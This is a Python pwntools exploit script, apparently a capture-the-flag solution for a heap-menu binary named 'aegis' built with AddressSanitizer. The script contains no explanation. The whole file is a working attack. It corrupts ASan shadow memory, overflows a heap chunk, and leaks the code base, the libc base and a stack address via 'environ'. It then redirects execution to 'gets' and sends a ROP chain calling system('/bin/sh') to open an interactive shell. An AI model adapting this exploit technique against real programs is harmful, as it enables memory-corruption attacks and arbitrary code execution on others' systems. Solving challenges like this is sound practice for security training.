from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./aegis")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./aegis")
else:
    pass

def menu(choice):
    p.sendlineafter("Choice: ",str(choice))

def add(size,content,age):
    menu(1)
    p.sendlineafter("Size: ",str(size))
    p.sendafter("Content: ",content)
    p.sendlineafter("ID: ",str(age))

def show(index):
    menu(2)
    p.sendlineafter("Index: ",str(index))

def edit(index,content,age):
    menu(3)
    p.sendlineafter("Index: ",str(index))
    p.sendafter("Content: ",content)
    p.sendlineafter("ID: ",str(age))

def free(index):
    menu(4)
    p.sendlineafter("Index: ",str(index))

def secret(target):
    menu(666)
    log.success("target:" + hex(target))
    p.sendlineafter("Lucky Number: ",str(target))

def leak(target,length):
    edit(2,"A"*(length + 1),0xffffffffffffffff)
    edit(2,p64(target) + "\n",0)
    show(0)
    p.recvuntil("Content: ")
    leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
    return leak_addr

code_base = 0x555555554000
def debugf():
    if debug:
        gdb.attach(p,"b *{b1}\nb *{b2}".format(b1 = hex(code_base + 0x114206),b2 = hex(code_base + 0x113EBB)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
target = 0x602000000020
target = (target >> 3) + 0x7FFF8000
add(0x10,"a"*0x8,0xdeadbeefdeadbeef)
add(0x10,"a"*0x8,0xdeadbeefdeadbeef)
#show(0)
secret(target)
for i in range(0x6):
    edit(0,"a"*(0x12 + i),0xff)
payload = p64(0x02ffffff00000002) + p64(0x208000012fffffff)
#debugf()
payload = payload[:0xf]
edit(0,"a"*0x10 + payload[:7] + "\x02",u64(payload[7:]))
free(0)
target = 0x602000000018
add(0x10,p64(target),0x0)
show(0)
p.recvuntil("Content: ")
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
codebase = leak_addr - 0x114ab0
log.success("codebase:" + hex(codebase))
elf.address = codebase
#debugf()
leak_addr = leak(elf.got["puts"],1)
libc.address = leak_addr - libc.symbols["puts"]
log.success("libc_base:" + hex(libc.address))
leak_addr = leak(libc.symbols["environ"],6)
rip_addr = leak_addr - 0x150
log.success("libc_base:" + hex(rip_addr))
leak(rip_addr,6)
debugf()
#edit(0,p64(libc.symbols["gets"])[:-1],(codebase + 0x114ab0) << 16)
menu(3)
p.sendlineafter("Index: ",str(0))
p.sendafter("Content: ",p64(libc.symbols["gets"])[:-1])
rdi = elf.address + 0x000000000001c843
system = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload = p64(rdi) + p64(binsh) + p64(system)
p.sendline("aa" + payload)
p.interactive()
